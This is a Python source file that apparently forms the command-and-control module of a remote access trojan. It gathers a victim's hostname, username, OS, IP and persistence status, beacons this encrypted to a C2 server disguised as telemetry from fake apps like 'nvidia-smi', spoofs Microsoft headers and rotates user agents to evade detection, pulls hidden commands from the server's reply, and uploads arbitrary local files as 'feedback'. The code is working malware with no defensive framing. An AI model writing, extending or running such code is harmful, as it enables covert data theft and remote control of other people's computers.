import json
import random
import socket
import time
import urllib.parse
import urllib.request
import platform
import os

from cryptography.fernet import Fernet

APP_NAMES = ['hwmonitor', 'nvidia-smi', 'directx', 'vulkan-rt']

USER_AGENTS = [
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 '
    '(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 '
    '(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) '
    'Gecko/20100101 Firefox/120.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) '
    'AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15',
]


def get_system_info(is_persistent_fn) -> dict:
    return {
        'hostname': socket.gethostname(),
        'username': os.getenv('USER')
                    or os.getenv('USERNAME')
                    or 'unknown',
        'os': platform.platform(),
        'ip': socket.gethostbyname(socket.gethostname()),
        'persistent': is_persistent_fn(),
    }


def send_beacon(
    c2_server: str,
    info: dict,
    traffic_key: bytes,
) -> dict:
    info['screen_res'] = random.choice(
        ['1920x1080', '1366x768', '2560x1440', '1440x900']
    )
    info['lang'] = random.choice(
        ['en-US', 'nl-NL', 'de-DE', 'fr-FR']
    )
    info['tz'] = random.choice(
        ['Europe/Amsterdam', 'Europe/Berlin', 'America/New_York', 'UTC']
    )

    try:
        crypto = Fernet(traffic_key)
        encrypted = crypto.encrypt(json.dumps(info).encode()).decode()
        data = urllib.parse.urlencode(
            {'data': encrypted, 'v': '1'}
        ).encode()
        url = (
            f"{c2_server}/api/telemetry"
            f"?app={random.choice(APP_NAMES)}&v=1.0&_={int(time.time() * 1000)}"
        )
        req = urllib.request.Request(url, data=data)
        req.add_header('User-Agent', random.choice(USER_AGENTS))
        req.add_header('Content-Type', 'application/x-www-form-urlencoded')
        req.add_header('Accept', 'application/json, text/plain, */*')
        req.add_header('Accept-Language', 'en-US,en;q=0.9')
        req.add_header('Origin', 'https://www.microsoft.com')
        req.add_header('Referer', 'https://www.microsoft.com/')

        resp = urllib.request.urlopen(req, timeout=10)
        body = json.loads(resp.read())

        if body.get('config', {}).get('flags'):
            try:
                cmd_data = crypto.decrypt(
                    body['config']['flags'].encode()
                )
                cmd = json.loads(cmd_data)
                if cmd.get('command'):
                    body['command'] = cmd
            except Exception:
                pass
        return body
    except Exception as e:
        return None


def upload_file(c2_server: str, hostname: str, local_path: str) -> str:
    try:
        with open(local_path, 'rb') as f:
            file_data = f.read()
        boundary = b'----boundary%x' % random.randint(0, 0xFFFFFFFF)
        body = (
            b'--' + boundary + b'\r\n'
            b'Content-Disposition: form-data; name="hostname"\r\n\r\n' +
            hostname.encode() + b'\r\n' +
            b'--' + boundary + b'\r\n'
            b'Content-Disposition: form-data; name="path"\r\n\r\n' +
            local_path.encode() + b'\r\n' +
            b'--' + boundary + b'\r\n'
            b'Content-Disposition: form-data; name="file"; '
            b'filename="' + os.path.basename(local_path).encode() + b'"\r\n'
            b'Content-Type: application/octet-stream\r\n\r\n' +
            file_data + b'\r\n' +
            b'--' + boundary + b'--\r\n'
        )
        req = urllib.request.Request(
            f"{c2_server}/api/feedback/upload",
            data=body,
            headers={'Content-Type': b'multipart/form-data; boundary=' + boundary},
        )
        resp = urllib.request.urlopen(req, timeout=30)
        result = json.loads(resp.read())
        return f'uploaded {result.get("size", 0)} bytes'
    except Exception as e:
        return f'upload failed: {e}'
